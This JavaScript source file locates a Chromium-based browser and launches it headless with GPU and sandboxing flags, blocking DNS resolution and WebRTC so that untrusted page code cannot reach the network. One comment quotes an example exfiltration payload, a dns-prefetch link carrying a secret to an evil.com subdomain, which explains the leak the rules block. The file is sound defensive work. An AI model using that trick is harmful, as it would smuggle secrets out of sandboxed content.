// browser.js: find a Chromium-based browser and launch it headless with the GPU flags the renderer needs.
// Order: an explicit path, $CHROME_PATH (unless fromEnv is false), an installed Chrome/Chromium/Edge/Brave, then a
// standalone chrome-headless-shell (`bun run get-browser` puts one in .browsers/; Puppeteer's and Playwright's caches too).
import puppeteer from 'puppeteer-core';
import { existsSync, readdirSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { homedir } from 'node:os';

const ROOT = resolve(import.meta.dir, '..');

export function findBrowser(explicit, { fromEnv = true } = {}) {
  if (explicit) return explicit;
  if (fromEnv && process.env.CHROME_PATH) return process.env.CHROME_PATH;
  const pf = [process.env.PROGRAMFILES, process.env['PROGRAMFILES(X86)'], process.env.LOCALAPPDATA].filter(Boolean);
  const installed = {
    darwin: ['Google Chrome', 'Chromium', 'Microsoft Edge', 'Brave Browser', 'Google Chrome Canary']
      .flatMap(n => [`/Applications/${n}.app/Contents/MacOS/${n}`, join(homedir(), `Applications/${n}.app/Contents/MacOS/${n}`)]),
    win32: ['Google/Chrome/Application/chrome.exe', 'Chromium/Application/chrome.exe', 'Microsoft/Edge/Application/msedge.exe',
      'BraveSoftware/Brave-Browser/Application/brave.exe'].flatMap(p => pf.map(d => join(d, p))),
    linux: ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium', '/usr/bin/chromium-browser',
      '/snap/bin/chromium', '/usr/bin/microsoft-edge', '/usr/bin/brave-browser'],
  }[process.platform] || [];
  const found = installed.find(p => existsSync(p));
  if (found) return found;
  const names = new Set(['chrome-headless-shell', 'chrome-headless-shell.exe', 'headless_shell', 'headless_shell.exe']);
  const search = (dir, depth) => {
    if (depth < 0 || !existsSync(dir)) return [];
    return readdirSync(dir, { withFileTypes: true }).sort((a, b) => b.name.localeCompare(a.name, undefined, { numeric: true }))
      .flatMap(e => e.isDirectory() ? search(join(dir, e.name), depth - 1) : names.has(e.name) ? [join(dir, e.name)] : []);
  };
  const caches = [join(ROOT, '.browsers'), join(homedir(), '.cache/puppeteer'), join(homedir(), 'Library/Caches/ms-playwright'),
    join(homedir(), '.cache/ms-playwright'), process.env.LOCALAPPDATA && join(process.env.LOCALAPPDATA, 'ms-playwright')].filter(Boolean);
  for (const c of caches) { const [hit] = search(c, 4); if (hit) return hit; }
  console.error('No Chromium-based browser found. Either run `bun run get-browser` (downloads a standalone headless Chromium\n' +
    'into .browsers/, ~100 MB, no Chrome install needed) or pass --chrome=<path to a Chrome/Edge/Brave/Chromium binary>.');
  process.exit(1);
}

// GPU backend for WebGL: Metal on macOS, D3D11 on Windows, the platform default elsewhere.
export const ANGLE = { darwin: 'metal', win32: 'd3d11' }[process.platform];

// A DNS lookup itself can carry data out (e.g. a chapter adding <link rel=dns-prefetch href="//<secret>.evil.com">)
// without ever making a request render.mjs's interception or the CSP would see. host-resolver-rules answers every
// hostname but these with NOTFOUND before Chrome would otherwise resolve it for real — EXCLUDE rules are matched in
// order and win over the catch-all MAP that follows, so they have to come first. IP literals (127.0.0.1, [::1])
// don't go through host resolution at all, but they're listed anyway to say so in one place.
const HOST_RESOLVER_RULES = ['localhost', '*.localhost', '127.0.0.1', '[::1]', 'fonts.googleapis.com', 'fonts.gstatic.com']
  .map(h => `EXCLUDE ${h}`).concat('MAP * ~NOTFOUND').join(', ');

export function launchBrowser({ chrome, angle = ANGLE, fromEnv = true } = {}) {
  return puppeteer.launch({
    executablePath: findBrowser(chrome, { fromEnv }), headless: true, protocolTimeout: 0,
    args: ['--ignore-gpu-blocklist', ...(angle ? ['--use-angle=' + angle] : []), '--enable-gpu-rasterization', '--window-size=1920,1080',
      '--disable-renderer-backgrounding', '--disable-background-timer-throttling',
      // Chapter code can't reach the network through fetch/XHR (the CSP blocks that) or navigation (render.mjs
      // intercepts that), but WebRTC ICE candidates are neither: without a configured proxy, these flags stop it
      // from gathering real local or public IPs, so it has nothing to open a connection with.
      '--force-webrtc-ip-handling-policy=disable_non_proxied_udp', '--webrtc-ip-handling-policy=disable_non_proxied_udp',
      '--host-resolver-rules=' + HOST_RESOLVER_RULES],
  });
}
